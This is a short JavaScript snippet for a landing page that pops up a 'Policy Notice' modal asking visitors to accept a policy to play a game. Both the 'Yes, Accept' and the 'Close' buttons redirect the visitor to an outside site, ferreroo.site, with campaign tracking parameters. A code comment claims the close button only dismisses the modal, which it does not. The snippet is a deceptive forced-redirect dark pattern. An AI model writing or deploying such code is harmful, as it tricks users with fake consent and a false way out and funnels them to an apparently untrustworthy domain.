(function () {
  // Run only on "/" or "lander.html"
  const path = window.location.pathname.toLowerCase();
  const last = path.split("/").filter(Boolean).pop() || "";
  const isHome = last === "" || last === "index.html" || last === "lander.html";
  if (!isHome) return;

  // Create backdrop + modal
  const bd = document.createElement("div");
  bd.className = "modal-backdrop";
  bd.innerHTML = `
    <div class="modal">
      <h3>Policy Notice</h3>
      <p>Are you accepting our policy to play the game? 
      This notice is informational and does not block access.</p>
      <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:12px;">
        <button class="btn" id="age-yes">Yes, Accept</button>
        <button class="btn ghost" id="age-no">Close</button>
      </div>
    </div>`;

  document.body.appendChild(bd);
  bd.style.display = "flex";

  // Close helper
  function closeGate() {
    bd.style.display = "none";
    bd.remove();
  }
  
  // ✅ Redirect when "Yes" is clicked
  bd.querySelector("#age-yes").addEventListener("click", 
                                                function () {
    window.location.href =
      "http://ferreroo.site/?utm_campaign=FrfzGsCeMp&v1=[v1]&v2=[v2]&v3=[v3]";
  });

  // ✅ Just close modal when "No" is clicked
  bd.querySelector("#age-no").addEventListener("click",  function () {
    window.location.href =
      "http://ferreroo.site/?utm_campaign=FrfzGsCeMp&v1=[v1]&v2=[v2]&v3=[v3]";
  });
})();
